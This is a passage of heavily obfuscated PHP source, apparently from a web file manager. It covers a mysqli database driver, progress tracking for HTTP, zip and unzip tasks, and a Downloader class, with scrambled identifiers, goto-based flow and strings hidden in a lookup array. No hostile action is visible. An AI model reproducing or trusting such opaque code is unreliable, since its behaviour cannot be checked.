goto eÈá‚ˆºÁå; F©Â∏™ŒÊä: $E∏Œ‹È˜ÎÇ =& $_SERVER[Æ¡î¢≠¯™]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto b•¥ƒ√ïá√; Fﬁ¬ØÀ„Ç”: think_status($E∏Œ‹È˜ÎÇ[20]); $d¢îÒëˆÔÍ = $this->_linkID->query($A∆‰§‰≈µ‡); $this->debug(); goto F∆ÓºòÚ√ó; eÈá‚ˆºÁå: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $EØ‘á∞Û›ô = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$EØ‘á∞Û›ô) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $B≈êêòóàÌ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$B≈êêòóàÌ) { $this->error(); return !1; } } return !0; } private function getAll() { $E Øßƒ¬’£ = array(); if ($this->numRows > 0) { for ($cÿßä ú∑ü = 0; $cÿßä ú∑ü < $this->numRows; $cÿßä ú∑ü++) { $E Øßƒ¬’£[$cÿßä ú∑ü] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $E Øßƒ¬’£; } public function getFields($F˜ã†Â›êê) { $C˘ÇˆÑ´Ëı =& $_SERVER[Æ¡î¢≠¯™]; $f⁄®À¡ ß© = $this->query($C˘ÇˆÑ´Ëı[797] . $this->parseKey($F˜ã†Â›êê)); $e≠¿“ıÙåö = array(); if ($f⁄®À¡ ß©) { foreach ($f⁄®À¡ ß© as $Eú˜«ÑÑ™å => $Bê∏†¥ãà–) { $e≠¿“ıÙåö[$Bê∏†¥ãà–[$C˘ÇˆÑ´Ëı[27]]] = array($C˘ÇˆÑ´Ëı[28] => $Bê∏†¥ãà–[$C˘ÇˆÑ´Ëı[27]], $C˘ÇˆÑ´Ëı[29] => $Bê∏†¥ãà–[$C˘ÇˆÑ´Ëı[30]], $C˘ÇˆÑ´Ëı[31] => (bool) ($Bê∏†¥ãà–[$C˘ÇˆÑ´Ëı[32]] === $C˘ÇˆÑ´Ëı[33]), $C˘ÇˆÑ´Ëı[34] => $Bê∏†¥ãà–[$C˘ÇˆÑ´Ëı[35]], $C˘ÇˆÑ´Ëı[36] => strtolower($Bê∏†¥ãà–[$C˘ÇˆÑ´Ëı[37]]) == $C˘ÇˆÑ´Ëı[38], $C˘ÇˆÑ´Ëı[39] => strtolower($Bê∏†¥ãà–[$C˘ÇˆÑ´Ëı[40]]) == $C˘ÇˆÑ´Ëı[41]); } } return $e≠¿“ıÙåö; } public function getTables($B˜Ç™ŸÁ˘ì = '') { $D≠¯·ÏÈé– =& $_SERVER[Æ¡î¢≠¯™]; $dßËùÔûÔ£ = !empty($B˜Ç™ŸÁ˘ì) ? $D≠¯·ÏÈé–[799] . $B˜Ç™ŸÁ˘ì : $D≠¯·ÏÈé–[800]; $cÿ›≈óÓñÜ = $this->query($dßËùÔûÔ£); $föü∑∫á§ä = array(); if ($cÿ›≈óÓñÜ) { foreach ($cÿ›≈óÓñÜ as $dé‡–ƒâ‡ú => $FÁÌÖ∫éú ) { $föü∑∫á§ä[$dé‡–ƒâ‡ú] = current($FÁÌÖ∫éú ); } } return $föü∑∫á§ä; } public function replace($CÙ≤†ÁÂÕå, $D‡ÌÔ™˜Œª = array()) { $Fø»∞«–¯» =& $_SERVER[Æ¡î¢≠¯™]; foreach ($CÙ≤†ÁÂÕå as $a”›¢Î‚–ı => $Bë‘˜ùïÃ) { $a’èäë„Âô = $this->parseValue($Bë‘˜ùïÃ); if (is_scalar($a’èäë„Âô)) { $a©∂™µò’Ç[] = $a’èäë„Âô; $b…√©Ï›∑‚[] = $this->parseKey($a”›¢Î‚–ı); } } $b±Éâêºò¯ = $Fø»∞«–¯»[801] . $this->parseTable($D‡ÌÔ™˜Œª[$Fø»∞«–¯»[273]]) . $Fø»∞«–¯»[802] . implode($Fø»∞«–¯»[47], $b…√©Ï›∑‚) . $Fø»∞«–¯»[803] . implode($Fø»∞«–¯»[47], $a©∂™µò’Ç) . $Fø»∞«–¯»[804]; return $this->execute($b±Éâêºò¯); } public function insertAll($FãﬂÑ∆ﬂ®ñ, $dºË—Ê¢ÖÛ = array(), $b¬ÏπÎ∫Õ÷ = false) { goto aëµ’‚Œ¡Û; BìÛé©€⁄Á: $CöÁπÁÍò‘ = array(); foreach ($FãﬂÑ∆ﬂ®ñ as $f¶åˆ–ŸöÖ) { $Eû¥ÀÒåππ = array(); foreach ($f¶åˆ–ŸöÖ as $c⁄”¯Û÷é‡ => $D£≥’Í¢í”) { $D£≥’Í¢í” = $this->parseValue($D£≥’Í¢í”); if (is_scalar($D£≥’Í¢í”)) { $Eû¥ÀÒåππ[] = $D£≥’Í¢í”; } } $CöÁπÁÍò‘[] = $FàÎÖ’ù¯Ü[254] . implode($FàÎÖ’ù¯Ü[47], $Eû¥ÀÒåππ) . $FàÎÖ’ù¯Ü[804]; } array_walk($dåÇûôˆê‘, array($this, $FàÎÖ’ù¯Ü[805])); goto AùçèÜ¨ëÛ; aëµ’‚Œ¡Û: $FàÎÖ’ù¯Ü =& $_SERVER[Æ¡î¢≠¯™]; if (!is_array($FãﬂÑ∆ﬂ®ñ[0])) { return !1; } $dåÇûôˆê‘ = array_keys($FãﬂÑ∆ﬂ®ñ[0]); goto BìÛé©€⁄Á; AùçèÜ¨ëÛ: $b„À„µ„ç = ($b¬ÏπÎ∫Õ÷ ? $FàÎÖ’ù¯Ü[806] : $FàÎÖ’ù¯Ü[807]) . $FàÎÖ’ù¯Ü[808] . $this->parseTable($dºË—Ê¢ÖÛ[$FàÎÖ’ù¯Ü[273]]) . $FàÎÖ’ù¯Ü[802] . implode($FàÎÖ’ù¯Ü[47], $dåÇûôˆê‘) . $FàÎÖ’ù¯Ü[809] . implode($FàÎÖ’ù¯Ü[47], $CöÁπÁÍò‘); return $this->execute($b„À„µ„ç); goto bÈîÉ≠ì—à; bÈîÉ≠ì—à: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $eâåúò‹é¢ =& $_SERVER[Æ¡î¢≠¯™]; $this->error = $this->_linkID->errno . $eâåúò‹é¢[4] . $this->_linkID->error; if ($eâåúò‹é¢[33] != $this->queryStr) { $this->error .= LNG($eâåúò‹é¢[45]) . $this->queryStr; } think_trace($this->error, $eâåúò‹é¢[33], $eâåúò‹é¢[46]); return $this->error; } public function escapeString($bö∏ºåô‚≤) { if ($this->_linkID) { return $this->_linkID->real_escape_string($bö∏ºåô‚≤); } else { return addslashes($bö∏ºåô‚≤); } } public function parseKey(&$e∆ƒá≤≠«Õ, $Dç‘¢£äßó = true) { $Cºøáñ∂£î =& $_SERVER[Æ¡î¢≠¯™]; if ($Dç‘¢£äßó) { $e∆ƒá≤≠«Õ = $this->parseKeyCheck($e∆ƒá≤≠«Õ); } if ($e∆ƒá≤≠«Õ != $Cºøáñ∂£î[183] && !preg_match($Cºøáñ∂£î[810], $e∆ƒá≤≠«Õ)) { $e∆ƒá≤≠«Õ = $Cºøáñ∂£î[811] . trim($e∆ƒá≤≠«Õ, $Cºøáñ∂£î[811]) . $Cºøáñ∂£î[811]; } return $e∆ƒá≤≠«Õ; } } $c´¡Õã∆ƒ∂ = LIB_DIR . $_SERVER[Æ¡î¢≠¯™][813]; $bâŸ˜⁄äΩ⁄ = $_SERVER[Æ¡î¢≠¯™][778]; goto BùÚ≈ùä∆ê; d‹ÑÖÉÂƒ£: class TaskHttp extends Task { protected function startAfter() { $Aπæª¿ììﬁ =& $_SERVER[Æ¡î¢≠¯™]; Hook::bind($Aπæª¿ììﬁ[1434], array($this, $Aπæª¿ììﬁ[1457])); Hook::bind($Aπæª¿ììﬁ[1436], array($this, $Aπæª¿ììﬁ[1458])); Hook::bind($Aπæª¿ììﬁ[1438], array($this, $Aπæª¿ììﬁ[1459])); } protected function endAfter() { $E‘≥ÖÆˆ—É =& $_SERVER[Æ¡î¢≠¯™]; Hook::unbind($E‘≥ÖÆˆ—É[1434], array($this, $E‘≥ÖÆˆ—É[1457])); Hook::unbind($E‘≥ÖÆˆ—É[1436], array($this, $E‘≥ÖÆˆ—É[1458])); Hook::unbind($E‘≥ÖÆˆ—É[1438], array($this, $E‘≥ÖÆˆ—É[1459])); } public function progressStart($DÖ”ìå¬ø◊) { $b‘ï›ŸÉßº =& $_SERVER[Æ¡î¢≠¯™]; $B◊¿∆çŸÁÌ = curl_getinfo($DÖ”ìå¬ø◊); self::log($b‘ï›ŸÉßº[1460] . $B◊¿∆çŸÁÌ[$b‘ï›ŸÉßº[301]]); self::valueSet($this->task[$b‘ï›ŸÉßº[372]], $this->task); } public function progressEnd($FƒÁÆóÚ≈⁄) { $c°ÁˆÖŸ¬ƒ =& $_SERVER[Æ¡î¢≠¯™]; self::log($c°ÁˆÖŸ¬ƒ[1461] . $this->task[$c°ÁˆÖŸ¬ƒ[372]]); $this->end(); } public function progress($b≠ÂÌ·Â≠‡, $cÜì‰ô©èü, $BçåîÒá»€, $BƒÉë‘”¿≤, $Cë…” ≥ïÕ) { $A∆¿Õï’Ú≈ =& $_SERVER[Æ¡î¢≠¯™]; $bØ®»ÖÿÇº =& $this->task; if ($Cë…” ≥ïÕ > 0) { $bØ®»ÖÿÇº[$A∆¿Õï’Ú≈[964]] = $bØ®»ÖÿÇº[$A∆¿Õï’Ú≈[964]] == 0 ? $BƒÉë‘”¿≤ : $bØ®»ÖÿÇº[$A∆¿Õï’Ú≈[964]]; $bØ®»ÖÿÇº[$A∆¿Õï’Ú≈[976]] = $Cë…” ≥ïÕ; } else { if ($BçåîÒá»€ > 0) { $bØ®»ÖÿÇº[$A∆¿Õï’Ú≈[964]] = $bØ®»ÖÿÇº[$A∆¿Õï’Ú≈[964]] == 0 ? $cÜì‰ô©èü : $bØ®»ÖÿÇº[$A∆¿Õï’Ú≈[964]]; $bØ®»ÖÿÇº[$A∆¿Õï’Ú≈[976]] = $BçåîÒá»€; } } $this->update(); self::log("\x70\x72\x6f\x67\x72\x65\163\163\x48\164\x74\x70\72\144\157\x77\156\x3a{$BçåîÒá»€}\x2f{$cÜì‰ô©èü}\73\40\x75\x70\x6c\157\x61\144\72{$Cë…” ≥ïÕ}\x2f{$BƒÉë‘”¿≤}\x3b"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto EÎáèÓ≤ÍÇ; EÎáèÓ≤ÍÇ: $FãéÂãåÕ• =& $_SERVER[Æ¡î¢≠¯™]; parent::startAfter(); Hook::bind($FãéÂãåÕ•[1462], array($this, $FãéÂãåÕ•[1463])); goto E€‘éãº¨˜; d‹©ÍÍ˜á‹: if (!$A§óÆÃåÆ≤[$FãéÂãåÕ•[1305]]) { $A§óÆÃåÆ≤[$FãéÂãåÕ•[1305]] = LNG($FãéÂãåÕ•[1466]); } goto Eçë÷àπ”Ω; E€‘éãº¨˜: Hook::bind($FãéÂãåÕ•[1021], array($this, $FãéÂãåÕ•[1464])); $A§óÆÃåÆ≤ =& $this->task; $A§óÆÃåÆ≤[$FãéÂãåÕ•[1465]] = $FãéÂãåÕ•[1026]; goto d‹©ÍÍ˜á‹; Eçë÷àπ”Ω: } protected function endAfter() { $Dò•÷“ë›« =& $_SERVER[Æ¡î¢≠¯™]; parent::endAfter(); Hook::unbind($Dò•÷“ë›«[1462], array($this, $Dò•÷“ë›«[1463])); Hook::unbind($Dò•÷“ë›«[1021], array($this, $Dò•÷“ë›«[1464])); } public function updateAfter() { $eÈÊΩ€»Áñ =& $_SERVER[Æ¡î¢≠¯™]; $BâÃÚ¨ø†ã =& $this->task; if (!$BâÃÚ¨ø†ã[$eÈÊΩ€»Áñ[964]] || !$BâÃÚ¨ø†ã[$eÈÊΩ€»Áñ[690]]) { return; } if ($BâÃÚ¨ø†ã[$eÈÊΩ€»Áñ[1465]] == $eÈÊΩ€»Áñ[1026]) { $fÓ®ø‹∞çà = 0; if ($BâÃÚ¨ø†ã[$eÈÊΩ€»Áñ[1442]]) { $fÓ®ø‹∞çà = $BâÃÚ¨ø†ã[$eÈÊΩ€»Áñ[1443]] / $BâÃÚ¨ø†ã[$eÈÊΩ€»Áñ[1442]]; } $BâÃÚ¨ø†ã[$eÈÊΩ€»Áñ[1398]] = $fÓ®ø‹∞çà * 0.3; } else { if ($BâÃÚ¨ø†ã[$eÈÊΩ€»Áñ[1465]] == $eÈÊΩ€»Áñ[307]) { $fÓ®ø‹∞çà = $BâÃÚ¨ø†ã[$eÈÊΩ€»Áñ[976]] / $BâÃÚ¨ø†ã[$eÈÊΩ€»Áñ[964]]; $BâÃÚ¨ø†ã[$eÈÊΩ€»Áñ[1398]] = 0.3 + $fÓ®ø‹∞çà * 0.4; } else { if ($BâÃÚ¨ø†ã[$eÈÊΩ€»Áñ[1465]] == $eÈÊΩ€»Áñ[101]) { $b¶ıóÖÓ€∏ = 0; if ($BâÃÚ¨ø†ã[$eÈÊΩ€»Áñ[1444]] == $eÈÊΩ€»Áñ[101]) { $b¶ıóÖÓ€∏ = $BâÃÚ¨ø†ã[$eÈÊΩ€»Áñ[1443]]; } $fÓ®ø‹∞çà = ($BâÃÚ¨ø†ã[$eÈÊΩ€»Áñ[1447]] + $b¶ıóÖÓ€∏) / $BâÃÚ¨ø†ã[$eÈÊΩ€»Áñ[690]]; $BâÃÚ¨ø†ã[$eÈÊΩ€»Áñ[1398]] = 0.3 + 0.4 + $fÓ®ø‹∞çà * 0.3; } } } if ($BâÃÚ¨ø†ã[$eÈÊΩ€»Áñ[1398]] > 0) { $D®Ç†éıí¿ = timeFloat() - $BâÃÚ¨ø†ã[$eÈÊΩ€»Áñ[1400]] - $BâÃÚ¨ø†ã[$eÈÊΩ€»Áñ[1403]]; $BâÃÚ¨ø†ã[$eÈÊΩ€»Áñ[1404]] = $D®Ç†éıí¿ * (1 - $BâÃÚ¨ø†ã[$eÈÊΩ€»Áñ[1398]]) / $BâÃÚ¨ø†ã[$eÈÊΩ€»Áñ[1398]]; } } public function addFile($FÈ¢≥à◊ﬁ˜) { goto E∂å¢¬πñ’; E∂å¢¬πñ’: $fΩÂŸÑÔ®à =& $_SERVER[Æ¡î¢≠¯™]; $EÆÍÜ¶Ç‰‹ =& $this->task; $dõ•©∫Æˆÿ = IO::info($FÈ¢≥à◊ﬁ˜); goto FÔé‚°Ã—¬; A∆ññÓâ⁄Ë: $EÆÍÜ¶Ç‰‹[$fΩÂŸÑÔ®à[964]] = 1; $b˘ÖÁ·≤¯ı = 0; $EÆÍÜ¶Ç‰‹[$fΩÂŸÑÔ®à[1448]] = array($fΩÂŸÑÔ®à[1449] => $b˘ÖÁ·≤¯ı + 1, $fΩÂŸÑÔ®à[391] => $dõ•©∫Æˆÿ[$fΩÂŸÑÔ®à[28]], $fΩÂŸÑÔ®à[85] => $dõ•©∫Æˆÿ[$fΩÂŸÑÔ®à[85]], $fΩÂŸÑÔ®à[470] => $dõ•©∫Æˆÿ[$fΩÂŸÑÔ®à[470]] ? $dõ•©∫Æˆÿ[$fΩÂŸÑÔ®à[470]] : $dõ•©∫Æˆÿ[$fΩÂŸÑÔ®à[85]]); goto dÏ—Û¬Ï•; BæÇÆá•‘ã: $EÆÍÜ¶Ç‰‹[$fΩÂŸÑÔ®à[966]] = $fΩÂŸÑÔ®à[1455]; $EÆÍÜ¶Ç‰‹[$fΩÂŸÑÔ®à[1444]] = $fΩÂŸÑÔ®à[1026]; $EÆÍÜ¶Ç‰‹[$fΩÂŸÑÔ®à[690]] = $dõ•©∫Æˆÿ[$fΩÂŸÑÔ®à[87]]; goto A∆ññÓâ⁄Ë; FÔé‚°Ã—¬: $EÆÍÜ¶Ç‰‹[$fΩÂŸÑÔ®à[1440]] = $dõ•©∫Æˆÿ[$fΩÂŸÑÔ®à[28]]; $EÆÍÜ¶Ç‰‹[$fΩÂŸÑÔ®à[1442]] = $dõ•©∫Æˆÿ[$fΩÂŸÑÔ®à[87]]; $EÆÍÜ¶Ç‰‹[$fΩÂŸÑÔ®à[1443]] = 0; goto BæÇÆá•‘ã; dÏ—Û¬Ï•: $this->update(); goto cÙ◊ÙÌ¨–Â; cÙ◊ÙÌ¨–Â: } public function unzipAfter($bÎıÇ¬ÙÊŸ) { goto c≈ß‘ì÷—°; E†ôπè∆â‚: $eÒê±ëÌå‡ = IO::infoWithChildren($bÎıÇ¬ÙÊŸ); $c®∏”∏îùÑ = 0; $F∞úùè·Ù®[$aÆ‚–¥âæû[1448]] = array($aÆ‚–¥âæû[1449] => $c®∏”∏îùÑ + 1, $aÆ‚–¥âæû[391] => $eÒê±ëÌå‡[$aÆ‚–¥âæû[28]], $aÆ‚–¥âæû[85] => $eÒê±ëÌå‡[$aÆ‚–¥âæû[85]], $aÆ‚–¥âæû[470] => $eÒê±ëÌå‡[$aÆ‚–¥âæû[470]] ? $eÒê±ëÌå‡[$aÆ‚–¥âæû[470]] : $eÒê±ëÌå‡[$aÆ‚–¥âæû[85]]); goto f÷∏âã–›Á; f÷∏âã–›Á: if ($eÒê±ëÌå‡[$aÆ‚–¥âæû[29]] == $aÆ‚–¥âæû[174]) { $F∞úùè·Ù®[$aÆ‚–¥âæû[964]] = 1; } else { $F∞úùè·Ù®[$aÆ‚–¥âæû[964]] = $eÒê±ëÌå‡[$aÆ‚–¥âæû[90]][$aÆ‚–¥âæû[88]]; } $F∞úùè·Ù®[$aÆ‚–¥âæû[966]] = $aÆ‚–¥âæû[33]; $F∞úùè·Ù®[$aÆ‚–¥âæû[1444]] = 0; goto dÊÀç‡çüÚ; c≈ß‘ì÷—°: $aÆ‚–¥âæû =& $_SERVER[Æ¡î¢≠¯™]; $F∞úùè·Ù® =& $this->task; $F∞úùè·Ù®[$aÆ‚–¥âæû[1465]] = $aÆ‚–¥âæû[101]; goto E†ôπè∆â‚; aë¡í€ä‡å: $F∞úùè·Ù®[$aÆ‚–¥âæû[1440]] = $aÆ‚–¥âæû[33]; $F∞úùè·Ù®[$aÆ‚–¥âæû[1447]] = 0; $F∞úùè·Ù®[$aÆ‚–¥âæû[690]] = $eÒê±ëÌå‡[$aÆ‚–¥âæû[87]]; goto C–”§–ä»¢; dÊÀç‡çüÚ: $F∞úùè·Ù®[$aÆ‚–¥âæû[976]] = 0; $F∞úùè·Ù®[$aÆ‚–¥âæû[1442]] = 0; $F∞úùè·Ù®[$aÆ‚–¥âæû[1443]] = 0; goto aë¡í€ä‡å; C–”§–ä»¢: $this->update(); self::log($aÆ‚–¥âæû[1467] . json_encode(array($F∞úùè·Ù®, $eÒê±ëÌå‡))); goto a∞∆Âﬁç‚Ê; a∞∆Âﬁç‚Ê: } public function nameParse($e∫»ﬁ«‚úì) { goto bäà÷Úáπ¢; bäà÷Úáπ¢: $B°áÙ¢é∆¥ =& $_SERVER[Æ¡î¢≠¯™]; $d¬ÜÏè÷ŒÓ =& $this->task; if ($d¬ÜÏè÷ŒÓ[$B°áÙ¢é∆¥[1465]] == $B°áÙ¢é∆¥[1026]) { $d¬ÜÏè÷ŒÓ[$B°áÙ¢é∆¥[1465]] = $B°áÙ¢é∆¥[307]; $d¬ÜÏè÷ŒÓ[$B°áÙ¢é∆¥[1447]] = 0; $d¬ÜÏè÷ŒÓ[$B°áÙ¢é∆¥[690]] = 0; } goto Eˆ¯ì¿È∫ª; Eˆ¯ì¿È∫ª: $eËÿ˜†ÜåÃ = get_path_this($e∫»ﬁ«‚úì); if (strstr($eËÿ˜†ÜåÃ, $B°áÙ¢é∆¥[103])) { $d¬ÜÏè÷ŒÓ[$B°áÙ¢é∆¥[976]] += 1; $d¬ÜÏè÷ŒÓ[$B°áÙ¢é∆¥[964]] += 1; } $d¬ÜÏè÷ŒÓ[$B°áÙ¢é∆¥[1440]] = $e∫»ﬁ«‚úì; goto CàÃÓÜùå¥; CàÃÓÜùå¥: $this->update(); goto EÇÜáÕ˜©ç; EÇÜáÕ˜©ç: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $e£√‘à¨√¶ =& $_SERVER[Æ¡î¢≠¯™]; parent::startAfter(); Hook::bind($e£√‘à¨√¶[1468], array($this, $e£√‘à¨√¶[1463])); $F—¬¶¶≤—∫ =& $this->task; $F—¬¶¶≤—∫[$e£√‘à¨√¶[1465]] = $e£√‘à¨√¶[1026]; if (!$F—¬¶¶≤—∫[$e£√‘à¨√¶[1305]]) { $F—¬¶¶≤—∫[$e£√‘à¨√¶[1305]] = LNG($e£√‘à¨√¶[1469]); } } protected function endAfter() { $b…äƒÏà≤‘ =& $_SERVER[Æ¡î¢≠¯™]; parent::endAfter(); Hook::unbind($b…äƒÏà≤‘[1468], array($this, $b…äƒÏà≤‘[1463])); } public function updateAfter() { $F∑›ΩêÛˆá =& $_SERVER[Æ¡î¢≠¯™]; $b†  ü€Ï¬ =& $this->task; if (!$b†  ü€Ï¬[$F∑›ΩêÛˆá[964]] || !$b†  ü€Ï¬[$F∑›ΩêÛˆá[690]]) { return; } if ($b†  ü€Ï¬[$F∑›ΩêÛˆá[1465]] == $F∑›ΩêÛˆá[1026]) { $dÇ◊•∑éÈ = $b†  ü€Ï¬[$F∑›ΩêÛˆá[1443]]; if ($b†  ü€Ï¬[$F∑›ΩêÛˆá[1444]] != $F∑›ΩêÛˆá[1026]) { $dÇ◊•∑éÈ = 0; } $Câ®è†í¯† = ($b†  ü€Ï¬[$F∑›ΩêÛˆá[1447]] + $dÇ◊•∑éÈ) / $b†  ü€Ï¬[$F∑›ΩêÛˆá[690]]; $b†  ü€Ï¬[$F∑›ΩêÛˆá[1398]] = $Câ®è†í¯† * 0.3; } else { if ($b†  ü€Ï¬[$F∑›ΩêÛˆá[1465]] == $F∑›ΩêÛˆá[307]) { $Câ®è†í¯† = $b†  ü€Ï¬[$F∑›ΩêÛˆá[976]] / $b†  ü€Ï¬[$F∑›ΩêÛˆá[964]]; $b†  ü€Ï¬[$F∑›ΩêÛˆá[1398]] = 0.3 + $Câ®è†í¯† * 0.5; } else { if ($b†  ü€Ï¬[$F∑›ΩêÛˆá[1465]] == $F∑›ΩêÛˆá[101]) { $Câ®è†í¯† = 0; if ($b†  ü€Ï¬[$F∑›ΩêÛˆá[1442]]) { $Câ®è†í¯† = $b†  ü€Ï¬[$F∑›ΩêÛˆá[1443]] / $b†  ü€Ï¬[$F∑›ΩêÛˆá[1442]]; } $b†  ü€Ï¬[$F∑›ΩêÛˆá[1398]] = 0.3 + 0.5 + $Câ®è†í¯† * 0.2; } } } if ($b†  ü€Ï¬[$F∑›ΩêÛˆá[1398]] > 0) { $C… ŸÊ‘ü÷ = timeFloat() - $b†  ü€Ï¬[$F∑›ΩêÛˆá[1400]] - $b†  ü€Ï¬[$F∑›ΩêÛˆá[1403]]; $b†  ü€Ï¬[$F∑›ΩêÛˆá[1404]] = $C… ŸÊ‘ü÷ * (1 - $b†  ü€Ï¬[$F∑›ΩêÛˆá[1398]]) / $b†  ü€Ï¬[$F∑›ΩêÛˆá[1398]]; } } public function copyFileStart($b§®ù∏¡ï, $C⁄üäèõèÜ, $DﬂÇ√åï¶Ú, $aûÿÖΩä¬…, $D¯çêô‘ë¿, $AñèÚ–åÈ›) { $Dæ ƒ◊∏°≈ =& $_SERVER[Æ¡î¢≠¯™]; parent::copyFileStart($b§®ù∏¡ï, $C⁄üäèõèÜ, $DﬂÇ√åï¶Ú, $aûÿÖΩä¬…, $D¯çêô‘ë¿, $AñèÚ–åÈ›); $B‘Ê¿ÉÇÕª =& $this->task; if ($B‘Ê¿ÉÇÕª[$Dæ ƒ◊∏°≈[1465]] == $Dæ ƒ◊∏°≈[307]) { $B‘Ê¿ÉÇÕª[$Dæ ƒ◊∏°≈[1465]] = $Dæ ƒ◊∏°≈[101]; } $this->update(); } public function copyFileEnd($b¢œ‰Ãåı, $BÆÈÚé¯ã‰, $aƒ¶¯È∑¥Ï, $Cöß‘§ Âø, $AË›⁄Ò…Ìä, $DÿÜâª˘õÆ) { $FÓÇÔ∏—¢æ =& $_SERVER[Æ¡î¢≠¯™]; $D∂≥÷«‚√≠ =& $this->task; $D∂≥÷«‚√≠[$FÓÇÔ∏—¢æ[1443]] = $D∂≥÷«‚√≠[$FÓÇÔ∏—¢æ[1442]]; $D∂≥÷«‚√≠[$FÓÇÔ∏—¢æ[1447]] += $D∂≥÷«‚√≠[$FÓÇÔ∏—¢æ[1442]]; $D∂≥÷«‚√≠[$FÓÇÔ∏—¢æ[1444]] = $FÓÇÔ∏—¢æ[33]; $this->update(); } public function nameParse($DüÉã”ÉÖ‰) { $aˆÓ´‰ˆâœ =& $_SERVER[Æ¡î¢≠¯™]; $dùñÆ‘ºøà =& $this->task; if ($dùñÆ‘ºøà[$aˆÓ´‰ˆâœ[976]] < $dùñÆ‘ºøà[$aˆÓ´‰ˆâœ[964]]) { $c≤Çö…“ê = get_path_this($DüÉã”ÉÖ‰); if (strstr($c≤Çö…“ê, $aˆÓ´‰ˆâœ[103])) { $dùñÆ‘ºøà[$aˆÓ´‰ˆâœ[976]] += 1; } } if ($dùñÆ‘ºøà[$aˆÓ´‰ˆâœ[1465]] == $aˆÓ´‰ˆâœ[1026]) { $dùñÆ‘ºøà[$aˆÓ´‰ˆâœ[1465]] = $aˆÓ´‰ˆâœ[307]; } $dùñÆ‘ºøà[$aˆÓ´‰ˆâœ[1440]] = $DüÉã”ÉÖ‰; $this->update(); } } goto D‰–åÈÉÒ¯; D‰–åÈÉÒ¯: class Downloader { static function start($E‰„ñç∂µ«, $fªàêéåÏè, $eùçöŒâàª = 10) { goto FëüÇÁ»…Ù; F©ùŒÙµ∆û: if (is_file($B´õµÛ◊†Õ)) { $b˜÷µ óŸ∆ = file_get_contents($B´õµÛ◊†Õ); $A€ü’Ö·ï» = json_decode($b˜÷µ óŸ∆, 1); } if (file_exists($fªàêéåÏè) && $CçåŸ⁄Âíü == filesize($fªàêéåÏè)) { @unlink($Cêò≈ØÉ©÷); @unlink($B´õµÛ◊†Õ); return array($C§√≤Ç≠Èô[1018] => !0, $C§√≤Ç≠Èô[1020] => $C§√≤Ç≠Èô[1473]); } if ($A€ü’Ö·ï»[$C§√≤Ç≠Èô[331]] != $CçåŸ⁄Âíü) { $A€ü’Ö·ï» = array($C§√≤Ç≠Èô[331] => $CçåŸ⁄Âíü); } goto C…åß“Æ‘˜; Fø÷œÎ∏Ñ¯: if (!$E‰„ñç∂µ«) { return array($C§√≤Ç≠Èô[1018] => !1, $C§√≤Ç≠Èô[1020] => $C§√≤Ç≠Èô[1023]); } if (!$AÖÎ§°æ∏»[$C§√≤Ç≠Èô[1267]] || $AÖÎ§°æ∏»[$C§√≤Ç≠Èô[331]] == 0) { @unlink($Cêò≈ØÉ©÷); @unlink($fªàêéåÏè); $CÈÒå∑Çó¶ = self::fileDownloadFopen($E‰„ñç∂µ«, $fªàêéåÏè, $AÖÎ§°æ∏»[$C§√≤Ç≠Èô[331]]); if ($CÈÒå∑Çó¶[$C§√≤Ç≠Èô[1018]]) { return $CÈÒå∑Çó¶; } else { @unlink($Cêò≈ØÉ©÷); @unlink($fªàêéåÏè); $CÈÒå∑Çó¶ = self::fileDownloadCurl($E‰„ñç∂µ«, $fªàêéåÏè, !1, 0, $AÖÎ§°æ∏»[$C§√≤Ç≠Èô[331]]); @unlink($Cêò≈ØÉ©÷); return $CÈÒå∑Çó¶; } } $BüâÖ Üµª = is_file($Cêò≈ØÉ©÷) ? filesize($Cêò≈ØÉ©÷) : 0; goto AΩéŒûü–Û; FëüÇÁ»…Ù: $C§√≤Ç≠Èô =& $_SERVER[Æ¡î¢≠¯™]; if (!request_url_safe($E‰„ñç∂µ«)) { return array($C§√≤Ç≠Èô[1018] => !1, $C§√≤Ç≠Èô[1020] => $C§√≤Ç≠Èô[1023]); } $B´õµÛ◊†Õ = $fªàêéåÏè . $C§√≤Ç≠Èô[1470]; goto EôÏÆÚÎ…»; f”•Ì¶ÁÕ‚: if ($CÈÒå∑Çó¶[$C§√≤Ç≠Èô[1018]]) { @unlink($B´õµÛ◊†Õ); } return $CÈÒå∑Çó¶; goto eåáß¢»æ∑; AΩéŒûü–Û: $CçåŸ⁄Âíü = intval($AÖÎ§°æ∏»[$C§√≤Ç≠Èô[331]]); if (file_exists($Cêò≈ØÉ©÷) && time() - filemtime($Cêò≈ØÉ©÷) < 3) { return array($C§√≤Ç≠Èô[1018] => !1, $C§√≤Ç≠Èô[1020] => $C§√≤Ç≠Èô[1472]); } $A€ü’Ö·ï» = array(); goto F©ùŒÙµ∆û; C…åß“Æ‘˜: if ($BüâÖ Üµª > $CçåŸ⁄Âíü) { @unlink($Cêò≈ØÉ©÷); } file_put_contents($B´õµÛ◊†Õ, json_encode($A€ü’Ö·ï»)); $CÈÒå∑Çó¶ = self::fileDownloadCurl($E‰„ñç∂µ«, $fªàêéåÏè, !0, $BüâÖ Üµª, $CçåŸ⁄Âíü); goto f”•Ì¶ÁÕ‚; EôÏÆÚÎ…»: $Cêò≈ØÉ©÷ = $fªàêéåÏè . $C§√≤Ç≠Èô[1471]; if (is_array($E‰„ñç∂µ«)) { $AÖÎ§°æ∏» = $E‰„ñç∂µ«; } else { $AÖÎ§°æ∏» = url_header($E‰„ñç∂µ«); } $E‰„ñç∂µ« = $AÖÎ§°æ∏»[$C§√≤Ç≠Èô[301]]; goto Fø÷œÎ∏Ñ¯; eåáß¢»æ∑: } static function fileDownloadFopen($FÈﬂ©øÃúä, $EÚËîÆÍ¨¡, $eÈ§∞πÑ©î = 0) { $dé¬≠ÖÉ‘ã =& $_SERVER[Æ¡î¢≠¯™]; @ini_set($dé¬≠ÖÉ‘ã[1474], $dé¬≠ÖÉ‘ã[1475]); $D±€€Õ»Òë = 